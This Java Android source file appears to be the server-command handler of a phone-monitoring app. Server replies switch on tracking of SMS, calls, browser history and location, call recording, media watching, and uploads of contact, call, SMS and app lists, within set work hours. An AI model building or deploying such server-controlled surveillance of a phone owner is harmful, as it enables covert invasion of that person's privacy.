package com.inet.android.request;

import java.io.IOException;

import org.json.JSONException;
import org.json.JSONObject;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.os.AsyncTask;
import android.preference.PreferenceManager;

import com.inet.android.db.RequestDataBaseHelper;
import com.inet.android.db.RequestWithDataBase;
import com.inet.android.info.GetInfo;
import com.inet.android.list.TurnSendList;
import com.inet.android.media.monitorMediaFiles;
import com.inet.android.sms.SmsSentObserver;
import com.inet.android.utils.Logging;

/**
 * Periodic request class is designed to handle the server's response
 * 
 * @author johny homicide
 * 
 */
public class PeriodicRequest extends DefaultRequest {
	private final String LOG_TAG = "PeriodicRequest";
	static RequestDataBaseHelper db;
	SmsSentObserver smsSentObserver = null;
	TurnSendList sendList;
	private final int type = 2;
	boolean periodicalFlag = true;
	Context ctx;

	public PeriodicRequest(Context ctx) {
		super(ctx);
		this.ctx = ctx;
	}

	@Override
	public void sendRequest(String request) {
		PeriodicRequestTask frt = new PeriodicRequestTask();
		frt.execute(request);
	}

	class PeriodicRequestTask extends AsyncTask<String, Void, Void> {

		@Override
		protected void onPreExecute() {
			super.onPreExecute();
		}

		@Override
		protected Void doInBackground(String... strs) {
			sendPostRequest(strs[0]);
			return null;
		}

		@Override
		protected void onPostExecute(Void result) {
			super.onPostExecute(result);
		}
	}

	@Override
	protected void sendPostRequest(String request) {
		if (!request.equals(" ")) {
			String str = null;
			try {
				Logging.doLog(LOG_TAG, request, request);
				str = Caller.doMake(request, "periodic", ctx);
			} catch (IOException e) {
				e.printStackTrace();
				// ----------! exist start request in base ------------------

				db = new RequestDataBaseHelper(ctx);

				if (db.getExistType(type) == false) {
					db.addRequest(new RequestWithDataBase(request, type, null,
							null, null));
				}
			}
			if (str != null) {
				getRequestData(str);
			} else {
				Logging.doLog(LOG_TAG,
						"ответа от сервера нет или он некорректен",
						"ответа от сервера нет или он некорректен");
				SharedPreferences sp = PreferenceManager
						.getDefaultSharedPreferences(ctx);
				Editor ed = sp.edit();
				ed.putString("code", "1");
				ed.commit();

			}
		} else {
			Logging.doLog(LOG_TAG, "request == null", "request == null");
		}
	}

	@Override
	protected void getRequestData(String response) {
		Logging.doLog(LOG_TAG, "getResponseData: " + response,
				"getResponseData: " + response);

		SharedPreferences sp = PreferenceManager
				.getDefaultSharedPreferences(ctx);
		Editor ed = sp.edit();
		sendList = new TurnSendList(ctx);
		JSONObject jsonObject;
		try {
			jsonObject = new JSONObject(response);
		} catch (JSONException e) {
			return;
		}

		String str = null;
		String audio = null;

		try {
			str = jsonObject.getString("code");
		} catch (JSONException e) {
			str = null;
		}
		if (str != null) {
			ed.putString("code", str);
		} else {
			ed.putString("code", "");
		}

		// --------Standby decision-----------
		if (str.equals("1")) {
			ed.putString("period", "1");
			ed.commit();
			return;
		}

		// -------------transition to the passive mode--------
		if (str.equals("3")) {
			ed.putString("period", "10");
			ed.commit();
			return;
		}

		// ----------------errors-----------------
		if (str.equals("0")) {
			String errstr = null;
			try {
				errstr = jsonObject.getString("error");
			} catch (JSONException e) {
				errstr = null;
			}
			if (errstr != null) {
				ed.putString("error", errstr);
			} else {
				ed.putString("error", "");
			}
			ed.commit();
			return;
		}

		// -----------active mode-----------------
		if (str.equals("2")) {
			if (sp.getBoolean("getInfo", false) == true) {
				GetInfo getInfo = new GetInfo(ctx);
				getInfo.startGetInfo();
				ed.putBoolean("getInfo", false);
			}
			ed.putString("period", "1");
			ed.commit();
		}
		// ----------frequency location------------
		try {
			str = jsonObject.getString("geo");
		} catch (JSONException e) {
			str = null;
		}
		if (str != null) {
			ed.putString("geo", str);
		} else {
			ed.putString("geo", "0");
		}
		// -----------positioning mode----------------
		try {
			str = jsonObject.getString("geo_mode");
		} catch (JSONException e) {
			str = null;
		}
		if (str != null) {
			ed.putString("geo_mode", str);
		} else {
			ed.putString("geo_mode", "1");
		}
		// -----------monitoring sms----------------
		try {
			str = jsonObject.getString("sms");
		} catch (JSONException e) {
			str = null;
		}
		if (str != null) {
			ed.putString("sms", str);

		} else {
			ed.putString("sms", "0");
		}
		// ------------monitoring of calls--------------
		try {
			str = jsonObject.getString("call");
		} catch (JSONException e) {
			str = null;
		}
		if (str != null) {
			ed.putString("call", str);
		} else {
			ed.putString("call", "0");
		}
		// ----------monitoring browser history-----------
		try {
			str = jsonObject.getString("www");
		} catch (JSONException e) {
			str = null;
		}
		if (str != null) {
			ed.putString("www", str);
		} else {
			ed.putString("www", "0");
		}

		// ----------record call-----------
		try {
			str = jsonObject.getString("recall");
		} catch (JSONException e) {
			str = null;
		}
		if (str != null) {
			ed.putString("recall", str);
		} else {
			ed.putString("recall", "0");
		}

		// ----------time server-----------
		try {
			str = jsonObject.getString("UTCT");
		} catch (JSONException e) {
			str = null;
		}
		if (str != null) {
			ed.putString("UTCT", str);
		} else {
			ed.putString("UTCT", "0");
		}

		// --------start time work------------
		try {
			str = jsonObject.getString("time_from");
		} catch (JSONException e) {
			str = null;
		}
		if (str != null) {
			ed.putString("time_from", str);
		} else {
			ed.putString("time_from", "");
		}

		// ------------stop time---------------
		try {
			str = jsonObject.getString("time_to");
		} catch (JSONException e) {
			str = null;
		}
		if (str != null) {
			ed.putString("time_to", str);
		} else {
			ed.putString("time_to", "");
		}

		// ---------lunchtime start-------------
		try {
			str = jsonObject.getString("brk_from");
		} catch (JSONException e) {
			str = null;
		}
		if (str != null) {
			ed.putString("brk_from", str);
		} else {
			ed.putString("brk_from", "");
		}

		// ---------lunchtime stop----------------
		try {
			str = jsonObject.getString("brk_to");
		} catch (JSONException e) {
			str = null;
		}
		if (str != null) {
			ed.putString("brk_to", str);
		} else {
			ed.putString("brk_to", "");
		}
		// ----------------image and audio detect----------------------
		try {
			str = jsonObject.getString("image");
			audio = jsonObject.getString("audio");
		} catch (JSONException e) {
			str = null;
		}
		if (str != null && audio != null) {
			monitorMediaFiles stateImage = monitorMediaFiles
					.getInstance(ctx);
			ed.putString("image_state", str);
			ed.putString("audio_state", str);
			if (str.equals("1") || audio.equals("1")) {
				if (stateImage.State() == false)
					stateImage.StartWatcher();
			} else
				stateImage.StopWatcher();
		}

		// ----------------method of sending files----------------------
		try {
			str = jsonObject.getString("dispatch");
		} catch (JSONException e) {
			str = null;
		}
		if (str != null)
			ed.putString("dispatch", str);
		else
			ed.putString("dispatch", str);

		// ---------------calls list------------------------

		try {
			str = jsonObject.getString("calls_list");
		} catch (JSONException e) {
			str = null;
		}
		if (str != null)
			if (!str.equals("0") && !sp.getString("list_call", "0").equals(str)) {
				sendList.setList("1", str, null);
			}
		// ---------------sms list------------------------
		try {
			str = jsonObject.getString("sms_list");
		} catch (JSONException e) {
			str = null;
		}
		if (str != null)
			if (!str.equals("0") && !sp.getString("list_sms", "0").equals(str)) {
				sendList.setList("2", str, null);
			}

		// ---------------contacts list------------------------

		try {
			str = jsonObject.getString("contacts_list");
		} catch (JSONException e) {
			str = null;
		}
		if (str != null)
			if (!str.equals("0")
					&& !sp.getString("list_contact", "0").equals(str)) {
				sendList.setList("3", str, null);
			}
		// ---------------apps list------------------------

		try {
			str = jsonObject.getString("apps_list");
		} catch (JSONException e) {
			str = null;
		}
		if (str != null)
			if (!str.equals("0") && !sp.getString("list_app", "0").equals(str)) {
				sendList.setList("4", str, null);
			}

		// ---------------error------------------------

		try {
			str = jsonObject.getString("error");
			if (str.equals("0")) {
				Logging.doLog(LOG_TAG, "account не найден", "account не найден");
				ed.putString("account", "account");
			}
			if (str.equals("1"))
				Logging.doLog(LOG_TAG,
						"imei отсутствует или имеет неверный формат",
						"imei отсутствует или имеет неверный формат");
			if (str.equals("2"))
				Logging.doLog(LOG_TAG, "устройство с указанным imei уже есть",
						"устройство с указанным imei уже есть");
			if (str.equals("3"))
				Logging.doLog(LOG_TAG, "отсутствует ключ", "отсутствует ключ");
			if (str.equals("4"))
				Logging.doLog(LOG_TAG, "отсутствует или неверный type",
						"отсутствует или неверный type");

		} catch (JSONException e) {
			str = null;
		}
		if (str != null) {
			ed.putString("error", str);
		} else {
			ed.putString("error", "");
		}

		ed.commit();
	}
}